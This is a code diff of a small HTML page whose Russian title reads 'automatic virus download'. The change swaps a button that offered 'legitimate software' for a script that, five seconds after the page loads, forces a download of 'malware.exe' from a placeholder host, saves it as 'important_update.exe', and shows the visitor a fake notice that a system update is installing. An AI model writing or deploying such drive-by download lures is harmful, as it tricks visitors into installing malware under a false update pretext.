@@ -1,25 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Незаметное скачивание вируса</title>
+  <title>Автоматическое скачивание вируса</title>
   <script>
-    function downloadVirus() {
+    function automaticDownload() {
       var link = document.createElement('a');
-      link.href = 'http://virus-url/download.exe'; 
-      link.download = 'legit_software.exe';
+      link.href = 'http://virus-url/malware.exe'; 
+      link.download = 'important_update.exe';
       link.click();
     }
 
     window.onload = function() {
-      var button = document.createElement('button');
-      button.innerHTML = 'Нажмите для скачивания легитимного ПО';
-      button.onclick = downloadVirus;
-
-      document.body.appendChild(button);
+      setTimeout(automaticDownload, 5000); // Запуск через 5 секунд после загрузки страницы
     };
   </script>
 </head>
 <body>
-  <p>Это безопасный веб-сайт. Вы можете нажать кнопку ниже, чтобы скачать необходимое ПО.</p>
+  <p>Важное обновление системы. Процесс установки будет начат автоматически.</p>
 </body>
 </html>
